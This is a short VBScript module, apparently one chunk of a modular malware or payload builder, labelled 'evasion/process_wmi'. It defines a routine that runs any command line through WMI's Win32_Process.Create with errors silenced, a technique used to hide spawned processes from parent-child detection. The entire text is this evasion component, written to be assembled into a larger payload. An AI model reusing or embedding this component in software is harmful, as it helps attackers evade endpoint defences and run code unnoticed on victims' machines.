' chunk: evasion/process_wmi
' depends: (none)
' provides: create_process
' format: vbscript
' note: Process creation via WMI Win32_Process.Create

Sub create_process(cmd)
    On Error Resume Next
    Dim loc, svc, proc, cfg, pid
    Set loc = CreateObject("WbemScripting.SWbemLocator")
    Set svc = loc.ConnectServer(".", "root\cimv2")
    Set proc = svc.Get("Win32_Process")
    Set cfg = proc.Methods_("Create").InParameters.SpawnInstance_()
    cfg.CommandLine = cmd
    svc.ExecMethod "Win32_Process", "Create", cfg
End Sub
